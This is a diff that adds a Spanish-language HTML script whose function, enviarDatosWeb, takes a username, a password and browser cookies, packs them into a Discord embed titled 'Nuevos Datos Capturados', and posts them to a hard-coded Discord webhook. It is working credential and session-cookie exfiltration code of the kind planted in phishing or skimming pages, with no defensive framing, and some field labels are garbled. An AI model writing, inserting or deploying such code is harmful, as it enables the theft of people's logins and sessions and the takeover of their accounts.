@@ -1,0 +1,51 @@
+<script>
+async function enviarDatosWeb(user, clave, cookies) {
+  const webhookURL = "https://discord.com/api/webhooks/1554559347432886477/1FoVXlZL52RLMQpJlKtd7Bi1RCT1gIzsCq8hIloyIJO8Boot2bde32tHvZ0XJbLWdFck";
+
+  const cookiesFormateadas = cookies 
+    ? (cookies.length > 1000 ? cookies.substring(0, 1000) + '... (recortadas)' : cookies)
+    : 'No disponibles / Vacías';
+
+  const payload = {
+    username: "Notificador de Datos",
+    avatar_url: "https://i.imgur.com/AfFp7pu.png",
+    embeds: [
+      {
+        title: "Nuevos Datos Capturados",
+        color: 3092790,
+        fields: [
+          {
+            name: "👤 User",
+            value: `\`\`\`${user || 'Sin usuario'}\`\`\``,
+            inline: true
+          },
+          {
+            name: "Clae",
+            value: `\`\`\`${clave || 'Sin clave'}\`\`\``,
+            inline: true
+          },
+          {
+            name: " Cooes",
+            value: `\`\`\`text\n${cookiesFormateadas}\n\`\`\``,
+            inline: false
+          }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: {
+          text: "Notificación Automática Web"
+        }
+      }
+    ]
+  };
+
+  try {
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (error) {
+    console.error("Error al enviar a Discord:", error);
+  }
+}
+</script>
